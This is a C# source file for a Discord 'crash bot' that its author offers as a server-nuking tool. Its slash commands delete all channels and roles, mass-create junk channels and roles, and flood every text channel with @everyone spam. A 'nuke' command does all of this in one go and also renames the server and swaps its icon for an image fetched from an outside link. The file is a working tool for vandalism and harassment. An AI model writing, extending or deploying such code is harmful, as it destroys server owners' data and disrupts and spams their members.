using Discord;
using Discord.Interactions;
using Discord.WebSocket;

namespace DiscordCrashBot2025
{
    class Program
    {
        private static DiscordSocketClient _client;
        private static InteractionService _interactions;

        static async Task Main()
        {
            _client = new DiscordSocketClient(new DiscordSocketConfig
            {
                GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent
            });

            _interactions = new InteractionService(_client);

            _client.InteractionCreated += HandleInteraction;
            _client.Ready += OnReady;

            await _client.LoginAsync(TokenType.Bot, "YOUR_TOKEN_HERE");
            await _client.StartAsync();

            await _interactions.AddModuleAsync<SlashCommands>(null);

            await Task.Delay(-1);
        }

        private static async Task OnReady()
        {
            await _interactions.RegisterCommandsGloballyAsync();
            Console.WriteLine("Crash Bot by KolovraTT_. Bot started.");
        }

        private static async Task HandleInteraction(SocketInteraction interaction)
        {
            var context = new SocketInteractionContext(_client, interaction);
            await _interactions.ExecuteCommandAsync(context, null);
        }
    }

    public class SlashCommands : InteractionModuleBase<SocketInteractionContext>
    {
        [SlashCommand("ping", "Bot status")]
        public async Task Ping()
        {
            await RespondAsync($"Pong! Задержка: {Context.Client.Latency}ms");
        } 
        [SlashCommand("nchannels", "Delete all channels")]
        public async Task NukeChannels()
        {
            await DeferAsync();
            var channels = Context.Guild.Channels.ToList();
            await Task.WhenAll(channels.Select(c => c.DeleteAsync()));
            await FollowupAsync("💣 All channels deleted!");
        }

        [SlashCommand("nroles", "Delete all roles")]
        public async Task NukeRoles()
        {
            await DeferAsync();
            var roles = Context.Guild.Roles
                .Where(r => !r.IsManaged && r.Name != "@everyone")
                .ToList();
            await Task.WhenAll(roles.Select(r => r.DeleteAsync()));
            await FollowupAsync("💣 All roles have been deleted");
        }

        [SlashCommand("spchannels", "Create X channels")]
        public async Task SpamChannels(
    [Summary("name")] string name,
    [Summary("amount")] int amount)
        {
            await DeferAsync(); 
            var tasks = Enumerable
                .Range(0, amount)
                .Select(i => Context.Guild.CreateTextChannelAsync($"{name}-{i}"))
                .ToList();

            await Task.WhenAll(tasks);   
            await FollowupAsync($"✅ Created {amount} for one request!");
        }

        [SlashCommand("sproles", "Create X roles")]
        public async Task SpamRoles(
            [Summary("name")] string name,
            [Summary("amount")] int amount)
        {
            await DeferAsync();
            var rnd = new Random();
            var tasks = Enumerable.Range(0, amount).Select(async i =>
            {
                var color = new Color(rnd.Next(0, 255), rnd.Next(0, 255), rnd.Next(0, 255));
                await Context.Guild.CreateRoleAsync($"{name}", color: color);
            });
            await Task.WhenAll(tasks);
            await FollowupAsync($"✅ Created {amount} roles");
        }
        [SlashCommand("spall", "Spam messages to channels")]
        public async Task NuclearSpam(
    [Summary("text")] string text,
    [Summary("amount")] int amount = 100)
        {
            await DeferAsync(ephemeral: true);

            var channels = Context.Guild.Channels
                .Where(c => c is ITextChannel)
                .Cast<ITextChannel>();

            var tasks = channels.SelectMany(channel =>
                Enumerable.Range(0, amount)
                    .Select(_ => channel.SendMessageAsync(text))
            );

            await Task.WhenAll(tasks);
            await FollowupAsync($"☢️ {amount} messages have been sent in {channels.Count()} channels!");
        }
        [SlashCommand("nuke", "Full server nuke + spam")]
        public async Task NuclearCommand()
        {
            await DeferAsync(ephemeral: true);

            using (var http = new HttpClient())
            {
                var avatarUrl = "https://i.postimg.cc/QdMVSnqM/9cdd99f377e5882ee1c5b394395611cf.jpg";
                var avatarBytes = await http.GetByteArrayAsync(avatarUrl);

                using (var stream = new MemoryStream(avatarBytes))
                {
                    await Context.Guild.ModifyAsync(g =>
                    {
                        g.Name = "CRASHED BY KOLOVRATT";
                        g.Icon = new Image(stream);  
                    });
                }
            }

            var channels = Context.Guild.Channels.ToList();
            await Task.WhenAll(channels.Select(c => c.DeleteAsync()));

            var roles = Context.Guild.Roles
                .Where(r => !r.IsManaged && r.Name != "@everyone")
                .ToList();
            await Task.WhenAll(roles.Select(r => r.DeleteAsync()));

            var channelTasks = Enumerable.Range(0, 50)
                .Select(i => Context.Guild.CreateTextChannelAsync($"Crashed-by-KolovraTT-{i}"));
            await Task.WhenAll(channelTasks);

            var rnd = new Random();
            var roleTasks = Enumerable.Range(0, 50)
                .Select(i =>
                {
                    var color = new Color(rnd.Next(0, 255), rnd.Next(0, 255), rnd.Next(0, 255));
                    return Context.Guild.CreateRoleAsync("Crashed by KolovraTT", color: color);
                });
            await Task.WhenAll(roleTasks);

            var textChannels = Context.Guild.Channels.OfType<ITextChannel>();
            var spamTasks = textChannels.SelectMany(c =>
                Enumerable.Range(0, 100).Select(_ => c.SendMessageAsync("@everyone SERVER CRASHED BY KOLOVRATT")));
            await Task.WhenAll(spamTasks);

            await FollowupAsync("☢️ Server fully nuked and rebranded!");
        }
    }
}
